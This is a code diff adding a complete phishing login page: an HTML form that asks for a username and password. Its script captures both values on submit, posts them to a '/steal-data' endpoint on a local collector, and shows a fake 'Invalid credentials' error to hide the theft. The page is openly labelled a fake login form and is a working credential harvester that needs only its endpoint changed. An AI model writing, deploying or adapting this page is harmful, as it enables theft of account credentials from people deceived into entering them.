@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="loginContainer">
+        <div class="loginBox">
+            <h2>Login to Your Account</h2>
+            <form id="fakeLoginForm">
+                <div class="inputGroup">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="Enter your username" required>
+                </div>
+                <div class="inputGroup">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="loginButton">Login</button>
+            </form>
+            <p class="signupLink">Don't have an account? <a href="signup.html">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("fakeLoginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            let user = document.getElementById("username").value;
+            let pass = document.getElementById("password").value;
+            fetch("http://localhost:5001/steal-data", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username: user, password: pass })
+            });
+            alert("Error: Invalid credentials!"); // Fake error message
+        });
+    </script>
+</body>
+</html>
